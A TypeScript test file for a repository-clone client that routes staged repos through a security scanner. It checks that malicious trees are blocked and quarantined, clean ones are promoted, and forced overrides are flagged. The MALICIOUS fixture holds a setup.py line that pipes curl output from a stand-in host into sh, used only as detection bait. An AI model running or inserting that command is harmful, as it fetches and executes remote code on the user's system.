import assert from "node:assert/strict";
import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
/**
 * repo.test.ts — the GitHub Repo Manager client (file 06 §3 / FEATURE #5a) against the
 * surfaces that matter, mirroring modelhub/client.test.ts's discipline (REAL sidecar +
 * REAL nemesis over LOCAL planted staging dirs — no network):
 *
 *   1) repoClone({staged}) REAL GATE: a planted MALICIOUS staging dir is BLOCKED +
 *      QUARANTINED, NOT promoted (ok:false, blocked:true, status:"blocked") — the real
 *      scanner decides; JS never decides "safe" (C5). The verdict rides through camelCased.
 *   2) repoClone({staged}) REAL GATE: a planted CLEAN staging dir is PROMOTED (allow),
 *      with a NemesisVerdictRef bound to the commit + an index entry; repoList() shows it,
 *      repoRescan() refreshes the verdict, repoRemove() drops it.
 *   3) repoClone({staged, force:true}) REAL GATE: a malicious dir is force-promoted with
 *      forcedDanger flagged.
 *   4) force is REFUSED unless explicit: a clone WITHOUT force never emits --force, so a
 *      block stays blocked (proven by 1).
 *   5) argv contract: repoClone without a URL is a fail-closed ok:false (the sidecar
 *      validates), repoRescan of an unknown id fails closed.
 *
 * Hermetic: a temp $PROMETHEUS_REPOS_HOME forwarded to the child via process.env so the
 * test never touches the real ~/.config/prometheus/repos. Skips gracefully when repo.py
 * or the real nemesis binary is absent.
 */
import { test } from "node:test";
import { fileURLToPath } from "node:url";

import { createRepoClient } from "./repo.js";

const HERE = dirname(fileURLToPath(import.meta.url));
// the REAL studio/python/sidecar dir (…/engine-bridge/src -> up 3 = studio).
const REAL_SIDECAR_DIR = join(HERE, "..", "..", "..", "python", "sidecar");
const REAL_REPO_PY = join(REAL_SIDECAR_DIR, "repo.py");
// nemesis lives next to the engine at the sibling PROMETHEUS root (…/studio -> up 1).
const NEMESIS = join(HERE, "..", "..", "..", "..", "nemesis");

const MALICIOUS = 'import os\nos.system("curl http://evil.example/x.sh | sh")\n';
const CLEAN_README = "# demo\nA harmless repository for the gate test.\n";

function plant(files: Record<string, string>): string {
  const d = mkdtempSync(join(tmpdir(), "repo-ts-stage-"));
  for (const [name, body] of Object.entries(files)) writeFileSync(join(d, name), body);
  return d;
}

function withReposHome<T>(home: string, fn: () => Promise<T>): Promise<T> {
  const prev = process.env.PROMETHEUS_REPOS_HOME ?? "";
  process.env.PROMETHEUS_REPOS_HOME = home;
  return fn().finally(() => {
    process.env.PROMETHEUS_REPOS_HOME = prev;
  });
}

test("repoClone({staged}) REAL GATE: a malicious staging dir is BLOCKED + quarantined", async (t) => {
  if (!existsSync(REAL_REPO_PY) || !existsSync(NEMESIS)) {
    t.skip(`repo.py or nemesis not present (${REAL_REPO_PY}, ${NEMESIS})`);
    return;
  }
  const home = mkdtempSync(join(tmpdir(), "repo-ts-home-"));
  const stage = plant({ "setup.py": MALICIOUS });
  try {
    await withReposHome(home, async () => {
      const client = createRepoClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 180_000 });
      // must NOT throw — a block is a valid, renderable RepoResult (C5).
      const res = await client.repoClone("https://github.com/sketchy/repo", { staged: stage });

      assert.equal(res.ok, false, "a real BLOCK is ok:false");
      assert.equal(res.blocked, true, "blocked:true from the real scanner");
      assert.notEqual(res.promoted, true, "nothing was promoted");
      assert.equal(res.status, "blocked", "status flips to blocked");
      assert.equal(res.command, "clone");
      // the real gate verdict rides through camelCased — JS renders, never decides.
      assert.ok(res.gate, "the gate summary must ride through");
      assert.ok(
        res.gate?.verdict === "block" || res.gate?.verdict === "error",
        `real verdict is block/error, got ${res.gate?.verdict}`,
      );
      assert.ok(res.quarantined, "the staged clone is quarantined (kept for inspection)");
      assert.ok(existsSync(res.quarantined ?? ""), "the quarantine dir exists on disk");
    });
  } finally {
    rmSync(stage, { recursive: true, force: true });
    rmSync(home, { recursive: true, force: true });
  }
});

test("repoClone({staged}) REAL GATE: a clean staging dir is PROMOTED + indexed + has a verdict ref", async (t) => {
  if (!existsSync(REAL_REPO_PY) || !existsSync(NEMESIS)) {
    t.skip(`repo.py or nemesis not present (${REAL_REPO_PY}, ${NEMESIS})`);
    return;
  }
  const home = mkdtempSync(join(tmpdir(), "repo-ts-home-"));
  const stage = plant({ "README.md": CLEAN_README, LICENSE: "MIT License\n" });
  try {
    await withReposHome(home, async () => {
      const client = createRepoClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 180_000 });
      const res = await client.repoClone("https://github.com/acme/lib.git", { staged: stage });

      assert.equal(res.ok, true, "a clean tree is admitted");
      assert.equal(res.promoted, true, "promoted:true");
      assert.equal(res.verdict, "allow");
      assert.equal(res.status, "cloned");
      assert.ok(res.localPath, "the live clone path is returned");
      assert.ok(existsSync(join(res.localPath ?? "", "README.md")), "README moved into place");
      // the NemesisVerdictRef bound to the commit rides through (C3 shape).
      assert.ok(res.verdictRef, "a verdict ref is written");
      assert.equal(res.verdictRef?.verdict, "allow");
      assert.equal(typeof res.verdictRef?.score, "number");
      assert.equal(typeof res.verdictRef?.signedAt, "string");

      const id = res.id ?? "";
      assert.equal(id, "acme__lib", "the slug id is owner__name");

      // repoList() shows the one repo, status cloned.
      const repos = await client.repoList();
      assert.equal(repos.length, 1);
      assert.equal(repos[0]?.id, id);
      assert.equal(repos[0]?.status, "cloned");
      assert.equal(repos[0]?.owner, "acme");
      assert.equal(repos[0]?.lastVerdict?.verdict, "allow");

      // repoRescan() re-runs nemesis over the live tree (no fetch) and refreshes the ref.
      const rs = await client.repoRescan(id);
      assert.equal(rs.ok, true);
      assert.equal(rs.verdict, "allow");
      assert.equal(rs.status, "cloned");
      assert.ok(rs.verdictRef, "the rescan refreshes the verdict ref");

      // repoRemove() drops the clone dir + index entry.
      const rm = await client.repoRemove(id);
      assert.equal(rm.ok, true);
      assert.equal(rm.removedDir, true);
      assert.equal(rm.removedEntry, true);
      const after = await client.repoList();
      assert.equal(after.length, 0, "the index is empty after remove");
    });
  } finally {
    rmSync(stage, { recursive: true, force: true });
    rmSync(home, { recursive: true, force: true });
  }
});

test("repoClone({staged, force:true}) REAL GATE: a block is force-promoted with forcedDanger", async (t) => {
  if (!existsSync(REAL_REPO_PY) || !existsSync(NEMESIS)) {
    t.skip(`repo.py or nemesis not present (${REAL_REPO_PY}, ${NEMESIS})`);
    return;
  }
  const home = mkdtempSync(join(tmpdir(), "repo-ts-home-"));
  const stage = plant({ "setup.py": MALICIOUS });
  try {
    await withReposHome(home, async () => {
      const client = createRepoClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 180_000 });
      const res = await client.repoClone("https://github.com/forced/repo", {
        staged: stage,
        force: true,
      });
      assert.equal(res.promoted, true, "force promotes over the block");
      assert.ok(res.forcedDanger, "forcedDanger is flagged for the audit trail");
      assert.equal(res.forcedDanger?.verdict, "block");
      assert.ok(
        Array.isArray(res.forcedDanger?.blockingReasons),
        "the blocking reasons ride through",
      );
    });
  } finally {
    rmSync(stage, { recursive: true, force: true });
    rmSync(home, { recursive: true, force: true });
  }
});

test("repoClone without a URL fails closed (the sidecar validates; ok:false, not a throw)", async (t) => {
  if (!existsSync(REAL_REPO_PY)) {
    t.skip(`repo.py not present at ${REAL_REPO_PY}`);
    return;
  }
  const home = mkdtempSync(join(tmpdir(), "repo-ts-home-"));
  try {
    await withReposHome(home, async () => {
      const client = createRepoClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 30_000 });
      // empty URL → the sidecar refuses; this resolves to ok:false (never throws).
      const res = await client.repoClone("");
      assert.equal(res.ok, false, "no URL is a fail-closed ok:false");
      assert.ok(res.error, "an error message is surfaced");
    });
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test("repoRescan of an unknown id fails closed", async (t) => {
  if (!existsSync(REAL_REPO_PY)) {
    t.skip(`repo.py not present at ${REAL_REPO_PY}`);
    return;
  }
  const home = mkdtempSync(join(tmpdir(), "repo-ts-home-"));
  try {
    await withReposHome(home, async () => {
      const client = createRepoClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 30_000 });
      const res = await client.repoRescan("no-such-repo");
      assert.equal(res.ok, false, "unknown id is ok:false");
    });
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test("repoRemove of an unknown id is idempotent-ok (found:false, removedDir:false)", async (t) => {
  if (!existsSync(REAL_REPO_PY)) {
    t.skip(`repo.py not present at ${REAL_REPO_PY}`);
    return;
  }
  const home = mkdtempSync(join(tmpdir(), "repo-ts-home-"));
  try {
    await withReposHome(home, async () => {
      const client = createRepoClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 30_000 });
      const res = await client.repoRemove("ghost");
      assert.equal(res.ok, true, "removing a ghost is a no-op success");
      assert.equal(res.found, false);
      assert.equal(res.removedDir, false);
    });
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});
